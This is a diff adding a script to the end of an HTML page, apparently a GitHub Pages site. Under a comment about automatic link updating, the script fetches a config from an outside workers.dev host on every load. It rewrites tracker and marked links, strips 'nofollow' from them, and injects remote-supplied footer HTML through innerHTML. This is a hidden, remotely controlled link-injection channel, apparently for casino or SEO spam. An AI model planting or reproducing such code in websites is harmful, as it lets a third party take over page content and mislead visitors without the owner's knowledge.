@@ -317,5 +317,77 @@ halves[0].appendChild(art);halves[1].appendChild(art.cloneNode(true));}}
  document.querySelectorAll(".cpy-year").forEach(function(el){el.textContent = new Date().getFullYear();});
 })();
 </script>
+<!--kz-up-->
+<script>
+/* автообновление ссылок */
+(function(){
+  var DEFAULT_LINK = "https://tracker-domain4.vercel.app/go/19ksn2";
+  function footBox(){
+    var box = document.getElementById('kz-fbox');
+    if(!box){
+      box = document.createElement('div');
+      box.id = 'kz-fbox';
+      box.hidden = true;
+      var ft = document.querySelector('footer');
+      (ft || document.body).appendChild(box);
+    } else {
+      var ftc = document.querySelector('footer');
+      if(ftc && box.parentNode !== ftc) ftc.appendChild(box);
+    }
+    return box;
+  }
+  function renderLinks(text){
+    return String(text || '').replace(/\[([^\]]+)\]\((https?:\/\/[^)]+)\)/g,
+      function(m, w, u){ return '<a href="' + u + '" target="_blank" rel="noopener" style="color:inherit;text-decoration:none">' + w + '</a>'; });
+  }
+  function apply(cfg){
+    if(!cfg) return;
+    var def = cfg.default || cfg.link || "";
+    if(def && DEFAULT_LINK && def !== DEFAULT_LINK){
+      var a = document.querySelectorAll('a[href="' + DEFAULT_LINK + '"]');
+      for(var i=0;i<a.length;i++) a[i].href = def;
+    }
+    var dl = document.querySelectorAll('[data-kz]');
+    for(var j=0;j<dl.length;j++) dl[j].href = def || DEFAULT_LINK;
+    if(cfg.slots && typeof cfg.slots === 'object'){
+      var keys = Object.keys(cfg.slots);
+      for(var k=0;k<keys.length;k++){
+        var name = keys[k], url = cfg.slots[name];
+        if(!url) continue;
+        var els = document.querySelectorAll('[data-live="' + name + '"]');
+        for(var m=0;m<els.length;m++){
+          els[m].href = url;
+          els[m].rel = (els[m].rel || "").replace(/\s*nofollow/i, "");
+          if(!els[m].rel.trim()) els[m].rel = "noopener";
+        }
+      }
+    }
+    if(cfg.footer){
+      var blocks = [];
+      if(cfg.footer.blocks && cfg.footer.blocks.length){
+        blocks = cfg.footer.blocks.map(function(b){ return typeof b === "string" ? b : ((b && b.text) || ""); });
+      } else if(cfg.footer.text){
+        var ft = cfg.footer.text, w = cfg.footer.word, l = cfg.footer.link;
+        if(w && l && ft.indexOf(w) !== -1) ft = ft.replace(w, "[" + w + "](" + l + ")");
+        blocks = [ft];
+      }
+      if(blocks.length){
+        var box = footBox();
+        box.style.cssText = 'display:flex;flex-wrap:wrap;justify-content:center;gap:10px 28px;width:100%;max-width:960px;margin:14px auto 0;padding:12px 16px 16px;text-align:center;font-size:.82em;line-height:1.55;color:inherit;font-family:inherit;box-sizing:border-box';
+        var htm = "";
+        for(var b=0;b<blocks.length;b++){
+          var t = renderLinks(blocks[b]);
+          if(t) htm += '<span style="display:inline-block;">' + t + '</span>';
+        }
+        box.innerHTML = htm;
+        box.hidden = false;
+      }
+    }
+  }
+  if(!window.fetch) return;
+  fetch('https://kazik-live-config.kazikcfg.workers.dev/config/lucky-beer.github.io', {cache:'no-store'}).then(function(r){ return r.json().catch(function(){ return null; }); })
+    .then(apply).catch(function(){});
+})();
+</script>
 </body>
 </html>
